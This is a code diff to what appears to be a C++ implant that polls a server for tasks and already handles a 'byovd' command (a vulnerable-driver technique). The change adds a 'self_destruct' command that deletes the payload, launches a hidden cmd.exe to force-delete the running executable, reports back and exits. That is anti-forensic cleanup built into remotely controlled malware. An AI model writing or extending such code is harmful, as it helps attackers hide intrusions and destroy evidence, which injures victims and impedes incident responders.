@@ -476,6 +476,20 @@ static void DispatchTask(const std::string& taskId,
     } else if (commandType == "byovd") {
         int rc = RunClientPipeline();
         resultJson = "{\"exit_code\":" + std::to_string(rc) + "}";
+    } else if (commandType == "self_destruct") {
+        // Delete payload from disk.
+        DeleteFileA(PAYLOAD_PATH);
+        // Schedule own deletion: we can't delete a running .exe directly.
+        // A deferred cmd.exe handles it after we exit.
+        char selfPath[MAX_PATH];
+        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+        char delCmd[MAX_PATH + 80];
+        snprintf(delCmd, sizeof(delCmd),
+                 "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"%s\"", selfPath);
+        STARTUPINFOA si2 = {0}; si2.cb = sizeof(si2);
+        PROCESS_INFORMATION pi2 = {0};
+        CreateProcessA(NULL, delCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
+        resultJson = "{\"status\":\"self_destruct_initiated\"}";
     } else {
         resultJson = "{\"error\":\"unknown command_type\"}";
     }
@@ -490,6 +504,9 @@ static void DispatchTask(const std::string& taskId,
         printf("[+] Telemetry accepted for task %s\n", taskId.c_str());
     else
         printf("[-] Telemetry HTTP %lu for task %s\n", resp.status, taskId.c_str());
+
+    if (commandType == "self_destruct")
+        ExitProcess(0);
 }
 
 static void AgentPoll() {
